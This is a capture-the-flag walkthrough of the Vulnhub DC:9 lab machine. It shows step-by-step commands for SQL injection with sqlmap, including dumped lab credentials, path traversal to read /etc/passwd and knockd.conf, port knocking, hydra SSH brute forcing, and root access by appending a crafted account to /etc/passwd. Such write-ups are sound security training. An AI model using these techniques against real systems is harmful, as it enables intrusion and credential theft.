# DC:9 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

DC:9 is a CTF created by DCAU. You can find the technical information about this CTF on the VulnHub page. First of all, make sure to download and install the correct OVA file from VulnHub. (https://download.vulnhub.com/dc/DC-9.zip)

This is a normal difficulty CTF if you come this far. But it’s might be hard to find vulnerability.
## 1 - Reconnaissance

I started with classic rustscan , nmap and dirseach. I found out ssh port is closed. And found no vulnerability with script vulnerability scanning.

```bash
rustscan <machine_ip>
nmap -PN -sS -sC --script vuln -p 22,80 <machine_ip> -oN finalscan

dirsearch -u <machine_ip>
```

I manually checked the webpage. There was users table , manage page , search page and home page.

![DC9](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_xCq1Sd2r4HF8hiwzTcE3g.png "DC9")

I found some pages with directory search. When I visit this directories there was one interesting one. The welcome.php website says you are logged in as admin.

![DC9](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Ohrk_o635aSU007LXi0hbw.png "DC9")

But I was not an administrator yet, so I couldn’t copy the admin cookie directly. Instead, I used Burp Suite to capture it. If you don’t have Burp Suite, you can achieve the same with a basic curl command to copy the cookie.

I then focused on exploiting the manage and search pages. I saved the requests for these pages to files and attempted to run SQLMap on them.

```bash
sqlmap -r search.txt 
sqlmap -r manage.txt
```

I found out search field is vulnerable to sqlmap. Dc author makes machines to vulnerable on sqlmap somehow. I quickly exploit it.

## 2- Sqlmap

```bash
sqlmap -r search.txt --level=5 --dbs
(this give me 3 dbs users , staffs , information_schema)

sqlmap -r search.txt --level=5 -D users --tables
(this give me UserDetails table)

sqlmap -r search.txt --level=5 -D users -T UserDetails --dump
(this give me 
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+)
```

Now I have usernames and passwords. I created `users.txt` and `passwords.txt` files to store them. However, since the SSH service is closed, I couldn't use these credentials directly.

I attempted a path traversal attack on the URLs, starting with the search page, but I couldn’t get it to work. Next, I tried on the `manage.php` file and successfully accessed the `/etc/passwd` file.

Normally, you could use `wfuzz` to discover the file parameter, but in this case, it wasn’t as predictable.

```bash
http://10.0.2.18/manage.php?file=../../../../etc/passwd
```

Then I have reached the passwd file.

For a long time I stucked there. I couldn’t figure out how can I open the ssh port and exoploit it.

## 3- Hard part (port knocking)

I looked up how others solved this problem on this machine and found that the answer was port knocking. There’s a file located at `/etc/knockd.conf`, which contains the sequence values. This sequence lists three ports; if we "knock" on these ports in the correct order, port 22 will open.

I accessed the `/etc/knockd.conf` file by visiting `manage.php?file=../../../../etc/knockd.conf`, and it returned the sequence. So, I followed the sequence to unlock port 22.

```bash
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
```

The sequence part is important. Because we will use the knock tool on kali linux. You can download it github also.

```bash
knock <my_ip> 7469 8475 9842
```

Now you can control it with nmap. The 22 port is open. So we can connect it with users and passwords list.

## 4- SSH part

I used the users.txt and passwords.txt like that to brute force ssh.

```bash
hydra -L users.txt -P passwords.txt ssh://<machine_IP>
```

I found 3 users credentials.

After that, I logged in with each user but didn’t find anything important. However, the user “janitor” had a hidden directory named `secrets-for-putin`, which contained a password file with four passwords. I added these four passwords to `passwords.txt` and started the attack again. This time, I discovered a fourth user: "fredf."

![DC9](https://miro.medium.com/v2/resize:fit:828/format:webp/1*TdIRggUOqEq-t2XxGn8GZA.png "DC9")

I logged in with fredf.

## 5- Privilege Escalation

I tried sudo -l with fredf user. He can run the next command :

`/opt/devstuff/dist/test/test`

In devstuff directory there is a simple python script.

```bash
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

You give 2 files while executing this file and it simply appends first to second’s last line. So I read the /etc/passwd again.

I need to create a user with admin privileges.

```bash
root:x:0:0:root:/root:/bin/bash
```
I need to change the root part to name whatever I want. And need to change the x part to hashed password. Like the DC-4 I run the command and create a hash to my password.

```bash
openssl passwd -1
```

Now I have hash and I can save it to a file then append it to /etc/passwd so I can be a user

```bash
cd /tmp
echo 'yigitxd:$1$bvh55em2$Hzgmbcbgo/0pmsu5193pz.:0:0:root:/root:/bin/bash' > xd
chmod 777 xd
sudo /opt/devstuff/dist/test/test xd /etc/passwd
```

Now I can switch to user yigit. And now im root.

![DC9](https://miro.medium.com/v2/resize:fit:828/format:webp/1*9T5eTpgXC7_RtVLd3t9HUA.png "DC9")


Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)